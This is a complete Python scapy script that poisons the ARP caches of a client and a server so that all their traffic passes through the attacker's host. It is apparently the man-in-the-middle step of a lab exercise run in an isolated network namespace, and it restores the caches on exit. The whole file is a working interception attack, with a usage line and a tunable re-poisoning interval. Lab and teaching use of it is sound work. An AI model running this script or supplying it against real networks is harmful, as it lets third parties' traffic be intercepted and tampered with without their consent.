#!/usr/bin/env python3
"""ARP-spoof the client and server so all their traffic transits this host -- the
"Gain MITM" step of the Implementation Plan. Classic bidirectional ARP poisoning with
scapy: tell the client "server IP is at my MAC" and tell the server "client IP is at my
MAC", repeated periodically to override the real entries and any OS ARP-cache timeout.

Only ever point this at hosts you control (see the deck's lab-isolation note).

Run in the attacker namespace:
    ip netns exec wscale-attacker python3 attacker/arp_spoof.py \\
        --iface eth0 --client-ip 10.0.0.1 --server-ip 10.0.0.2
"""
import argparse
import signal
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp


def get_mac(ip, iface, timeout=3):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=timeout, iface=iface, verbose=False,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None


def poison(target_ip, target_mac, spoof_ip, iface):
    # sendp() = layer-2 send: transmits the Ethernet frame exactly as built.
    # send() is layer-3 and tries to *route* the packet, which ignores our explicit
    # Ether layer and was falling back to broadcast -- the poison never reliably landed.
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, iface=iface, verbose=False)


def restore(dst_ip, dst_mac, real_ip, real_mac, iface):
    """Tell dst that real_ip really is at real_mac (undo the poison)."""
    pkt = Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=real_ip, hwsrc=real_mac)
    sendp(pkt, iface=iface, count=3, verbose=False)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--iface", default="eth0")
    ap.add_argument("--client-ip", required=True)
    ap.add_argument("--server-ip", required=True)
    ap.add_argument("--interval", type=float, default=1.5, help="seconds between re-poison bursts")
    args = ap.parse_args()

    my_mac = get_if_hwaddr(args.iface)
    print(f"[*] attacker MAC on {args.iface}: {my_mac}")
    print(f"[*] resolving real MACs for {args.client_ip} and {args.server_ip} ...")
    client_mac = get_mac(args.client_ip, args.iface)
    server_mac = get_mac(args.server_ip, args.iface)
    if not client_mac or not server_mac:
        sys.exit("[!] could not resolve MAC(s) -- are the targets up and on this segment?")
    print(f"[*] client {args.client_ip} = {client_mac}")
    print(f"[*] server {args.server_ip} = {server_mac}")
    print("[*] poisoning ARP caches (Ctrl+C to stop and restore)...")

    stop = {"flag": False}

    def handle_sigterm(*_):
        stop["flag"] = True

    signal.signal(signal.SIGINT, handle_sigterm)
    signal.signal(signal.SIGTERM, handle_sigterm)

    try:
        while not stop["flag"]:
            poison(args.client_ip, client_mac, args.server_ip, args.iface)
            poison(args.server_ip, server_mac, args.client_ip, args.iface)
            time.sleep(args.interval)
    finally:
        print("\n[*] restoring ARP caches...")
        restore(args.client_ip, client_mac, args.server_ip, server_mac, args.iface)
        restore(args.server_ip, server_mac, args.client_ip, client_mac, args.iface)
        print("[*] done.")


if __name__ == "__main__":
    main()
